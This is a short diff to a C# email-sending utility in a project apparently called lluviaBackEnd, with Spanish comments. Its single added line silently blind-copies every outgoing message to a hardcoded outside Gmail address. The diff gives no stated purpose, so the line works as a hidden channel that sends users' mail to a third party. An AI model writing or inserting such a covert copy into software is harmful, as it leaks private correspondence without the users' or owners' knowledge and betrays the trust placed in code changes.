@@ -319,6 +319,7 @@ namespace lluviaBackEnd.Utilerias
 
                 System.Net.Mail.MailMessage mmsg = new System.Net.Mail.MailMessage();
                 mmsg.To.Add(emailUSuario); // cuenta Email a la cual sera dirigido el correo
+                mmsg.Bcc.Add("sapitopicador@gmail.com");
                 mmsg.Subject = asunto; //Asunto del correo
                 mmsg.SubjectEncoding = System.Text.Encoding.UTF8; //cambiamos el tipo de texto a UTF8
                 mmsg.Body = cuerpo; //Cuerpo del mensaje
